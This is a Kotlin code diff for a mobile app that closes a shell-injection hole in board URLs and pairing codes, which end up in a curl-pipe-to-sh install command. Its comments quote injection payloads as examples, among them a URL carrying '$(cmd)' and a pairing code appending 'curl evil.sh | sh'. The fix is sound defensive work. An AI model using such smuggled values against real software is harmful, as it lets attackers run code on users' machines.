@@ -10,6 +10,8 @@ import kotlinx.serialization.descriptors.SerialDescriptor
 import kotlinx.serialization.encoding.Decoder
 import kotlinx.serialization.encoding.Encoder
 import kotlinx.serialization.json.JsonDecoder
+import okhttp3.HttpUrl
+import okhttp3.HttpUrl.Companion.toHttpUrlOrNull
 import java.time.Instant
 import java.time.LocalDate
 import java.time.ZoneOffset
@@ -520,21 +522,72 @@ data class Board(
         val TOKEN_REGEX = Regex("^ags_[A-Za-z0-9_-]{32}$")
 
         /**
+         * Everything a board's authority may be spelled with: a host name,
+         * an IPv4 address or a bracketed IPv6 one, and a port. No `@`, so no
+         * userinfo, and nothing a shell reads as syntax: no `;`, `$`, `(`,
+         * quote, backtick or space. Nor `%`, `\`, `?` or `#`, for the reason
+         * in the last paragraph.
+         *
+         * Why so narrow, when OkHttp would take more: [baseUrl] is not only an
+         * address. PairCode.command() hands it to a shell as `--url`, and the
+         * Pair sheet draws [boardUrl] as a QR for the next phone to adopt.
+         * Earlier builds kept the raw text up to the first `/`, so
+         * `https://x;$(cmd);@agstatus.online/w/ags_<a real token>` was saved
+         * verbatim. OkHttp read the junk as a username and talked to the real
+         * board, so the board worked, Settings said "agstatus.online", and the
+         * one place the payload surfaced was the line a user is told to paste
+         * into a terminal. A real token is free; the attacker needed no server,
+         * only a QR code.
+         *
+         * The raw text is checked, not only OkHttp's parse of it, because that
+         * is what makes the two parsers agree: with none of `@ \ ? # %`
+         * present, OkHttp's authority ends exactly where this one's does.
+         * Underscores and raw IDN are the casualties — neither is a host name a
+         * public CA will certify, and the punycode spelling still parses.
+         *
+         * Rebuilding alone would not have been enough, which is why [origin]
+         * does both. iOS never had the userinfo form, because its
+         * normalizedOrigin rebuilds from scheme + host + port — but OkHttp
+         * and Foundation both accept `$`, `(` and `;` inside a host name
+         * (RFC 3986 allows them there), and a rebuild keeps the host. iOS
+         * refuses the same class now, in API.swift.
+         */
+        private val AUTHORITY_REGEX = Regex("^[A-Za-z0-9.:\\[\\]-]+$")
+
+        /**
+         * `scheme://host[:port]`, rebuilt from OkHttp's parse of [raw] — the
+         * parser every request goes through, so the origin saved is the one the
+         * app actually talks to. OkHttp's canonical form lowercases the host
+         * and drops a default port, which also makes
+         * `https://AgStatus.Online:443` the default server rather than a
+         * self-hosted one. Null for anything that is not http(s) with an
+         * authority [AUTHORITY_REGEX] accepts.
+         *
+         * WelcomeScreen's server field goes through here too, so a typed
+         * server and a scanned board cannot disagree about what an origin is.
+         */
+        fun origin(raw: String): String? {
+            val trimmed = raw.trim()
+            if (!hasHttpScheme(trimmed)) return null
+            val authority = trimmed.substringAfter("://").substringBefore('/')
+            if (!AUTHORITY_REGEX.matches(authority)) return null
+            val url = trimmed.toHttpUrlOrNull() ?: return null
+            // Unreachable past the regex (it has no `@`); kept so the rule
+            // reads in one place rather than as a property of a character class.
+            if (url.username.isNotEmpty() || url.password.isNotEmpty()) return null
+            return rebuiltOrigin(url)
+        }
+
+        /**
          * Parses a board URL as scanned or pasted by a user. Accepts
          * `https://host/w/ags_<32>` with or without a trailing slash or a
-         * `/webhook` suffix, and plain origins (legacy, token null).
+         * `/webhook` suffix, and plain origins (legacy, token null). The
+         * origin is [origin]'s rebuild, never the text as typed.
          */
         fun parse(raw: String): Board? {
             val trimmed = raw.trim()
-            if (!trimmed.startsWith("http://") && !trimmed.startsWith("https://")) return null
-
+            val origin = origin(trimmed) ?: return null
             val withoutScheme = trimmed.substringAfter("://")
-            if (withoutScheme.isBlank() || withoutScheme.startsWith("/")) return null
-
-            val scheme = trimmed.substringBefore("://")
-            val hostAndPort = withoutScheme.substringBefore('/')
-            if (hostAndPort.isBlank()) return null
-            val origin = "$scheme://$hostAndPort"
 
             var path = withoutScheme.substringAfter('/', "").trimEnd('/')
             if (path.endsWith("/webhook")) path = path.removeSuffix("/webhook").trimEnd('/')
@@ -546,17 +599,73 @@ data class Board(
             if (parts.size != 2 || parts[0] != "w" || !TOKEN_REGEX.matches(parts[1])) return null
             return Board(origin, parts[1])
         }
+
+        /**
+         * A board read back from storage, re-checked rather than trusted
+         * because this app wrote it: earlier builds saved whatever [parse]
+         * kept, and that could be `https://x;$(cmd);@agstatus.online`.
+         *
+         * Repaired where possible, dropped (null) where not. Repair rebuilds
+         * the origin from OkHttp's parse of the saved text with the userinfo
+         * stripped, and that is not a guess at what the user meant: it is the
+         * host every request to this board has gone to since the day it was
+         * adopted, because OkHttp has been reading the junk as a username all
+         * along. So the repaired board is the one already on screen — same
+         * server, same token, same sessions — minus the payload, and on the
+         * default server minus the `--url` altogether. Dropping it instead
+         * would sign the user out of a board that works, to protect them from
+         * a string the rebuild removes anyway.
+         *
+         * What cannot be repaired is dropped: text OkHttp cannot parse (no
+         * request could ever have reached it), and a host that itself carries
+         * a character [AUTHORITY_REGEX] refuses. OkHttp 4 accepts `$` and `(`
+         * inside a host name, and there is no cleaner host to fall back to.
+         */
+        fun restore(baseUrl: String, token: String?): Board? {
+            val url = baseUrl.trim().toHttpUrlOrNull() ?: return null
+            val rebuilt = rebuiltOrigin(url)
+            // The rebuild must survive the strict parser, or the host is the payload.
+            if (origin(rebuilt) != rebuilt) return null
+            return Board(rebuilt, token)
+        }
+
+        /** OkHttp's canonical scheme://host[:port]; userinfo, path, query and fragment dropped. */
+        private fun rebuiltOrigin(url: HttpUrl): String =
+            url.newBuilder()
+                .username("")
+                .password("")
+                .encodedPath("/")
+                .query(null)
+                .fragment(null)
+                .build()
+                .toString()
+                .trimEnd('/')
+
+        private fun hasHttpScheme(value: String): Boolean =
+            value.startsWith("http://", ignoreCase = true) || value.startsWith("https://", ignoreCase = true)
     }
 }
 
 // MARK: - Pairing
 
-@Serializable
+/**
+ * A pairing code and how long it has left.
+ *
+ * Not @Serializable. The server's answer decodes as `PairCodeResponse` in
+ * Api.kt and becomes a PairCode only through [fromServer], and `init` refuses
+ * anything but the canonical form — so a code that failed the check cannot
+ * exist anywhere: not in the sheet, not on the clipboard, not in
+ * SessionStore's cache, which rebuilds one from the last.
+ */
 data class PairCode(
-    /** Dash-grouped pairing code, e.g. "AB12-CD34". */
+    /** Canonical `XXXX-XXXX` over the server's alphabet, e.g. "AB2C-DE3F". */
     val code: String,
     val expiresInSeconds: Int = 0,
 ) {
+    init {
+        require(CANONICAL.matches(code)) { "Not a canonical pairing code" }
+    }
+
     /**
      * The terminal command a user runs to wire their machine to the board.
      *
@@ -565,6 +674,18 @@ data class PairCode(
      * script URL stays on the default server even when the board is
      * self-hosted: the board hands out `--url`, but the installer itself
      * still has to be fetched from somewhere the phone knows is current.
+     * That pin is also what stops a hostile board from running code on the
+     * machine any other way — install.sh fetches only GitHub releases and
+     * checks them against SHA256SUMS — so it must never follow the board.
+     *
+     * Both values are single-quoted ([shellQuoted]). That is the backstop,
+     * not the fix: the code is validated where it is decoded and the origin
+     * is rebuilt where it is parsed, so the quotes never have anything to
+     * escape. They are there so that loosening either check later cannot
+     * reopen this. Quoted, the line is still exactly what install.sh's
+     * argument loop expects: the user's shell strips the quotes before
+     * `sh -s --` passes the words on, so install.sh sees `--code` and
+     * `ABCD-EFGH` as the same two arguments it always did.
      *
      * PairSheet renders this in a wrapping Text with no maxLines, so the
      * extra length costs a second line on a phone and nothing else.
@@ -573,13 +694,66 @@ data class PairCode(
         append("curl -fsSL ")
         append(Board.DEFAULT_SERVER)
         append("/install.sh | sh -s -- --code ")
-        append(code)
+        append(shellQuoted(code))
         if (!board.isDefaultServer) {
             append(" --url ")
-            append(board.baseUrl)
+            append(shellQuoted(board.baseUrl))
         }
     }
+
+    companion object {
+        /**
+         * The server's generator, exactly: eight of PAIR_CODE_ALPHABET
+         * (src/store.ts) `ABCDEFGHJKMNPQRSTUVWXYZ23456789` — no I, L, O, 0
+         * or 1 — which app.ts renders `XXXX-XXXX`. The dash is optional on
+         * the way in because servers from before the display dash sent the
+         * eight bare. The class is spelled out letter by letter: the shorter
+         * `[A-HJ-NP-Z2-9]` reads the same and lets L through.
+         */
+        private val WIRE = Regex("^[A-HJKMNP-Z2-9]{4}-?[A-HJKMNP-Z2-9]{4}$")
+        private val CANONICAL = Regex("^[A-HJKMNP-Z2-9]{4}-[A-HJKMNP-Z2-9]{4}$")
+
+        /**
+         * The code as this app shows and copies it, or null for anything the
+         * server could not have minted.
+         *
+         * Why check what the server can only mint correctly: the app does not
+         * only talk to that server. A board the user adds — self-hosted, a
+         * colleague's, one in a QR — answers `POST /w/<token>/pair` with any
+         * JSON it likes, and the code lands in a line the user is told to
+         * paste into a terminal: `ABCD-EFGH; curl evil.sh | sh #` would have
+         * run, the `#` commenting out the `--url` after it. Against
+         * agstatus.online that adds nothing (it already serves the install.sh
+         * the line pipes into `sh`); against any other board it hands the
+         * operator exactly the code execution the pinned installer otherwise
+         * denies them. An allow-list, not a blocklist, for the reason the
+         * CLI's TOKEN_RE (cli/src/api.ts) gives: a server must not be able to
+         * smuggle `$(...)`, quotes or `;` through a value that reaches a shell.
+         */
+        fun normalize(raw: String): String? {
+            // ASCII first: outside it, uppercasing changes length or letter
+            // ("ſ".uppercase() is "S"), and nothing outside it is a code.
+            if (raw.any { it.code > 0x7F }) return null
+            val upper = raw.uppercase(Locale.ROOT)
+            if (!WIRE.matches(upper)) return null
+            val bare = upper.replace("-", "")
+            return "${bare.substring(0, 4)}-${bare.substring(4)}"
+        }
+
+        /** The server's answer as a PairCode, or null when its code fails [normalize]. */
+        fun fromServer(code: String, expiresInSeconds: Int): PairCode? =
+            normalize(code)?.let { PairCode(it, expiresInSeconds) }
+    }
 }
+
+/**
+ * [value] as one POSIX shell word: wrapped in single quotes, inside which
+ * nothing is special, with each `'` in it written `'\''` (close, escaped
+ * quote, reopen) — the same in sh, bash and zsh. fish also reads `\\` and
+ * `\'` inside single quotes, which is one more reason the values quoted here
+ * are validated first: neither can contain a backslash.
+ */
+internal fun shellQuoted(value: String): String = "'" + value.replace("'", "'\\''") + "'"
 
 /** `POST /api/workspaces` and `POST /api/pair/claim` both answer with this. */
 @Serializable
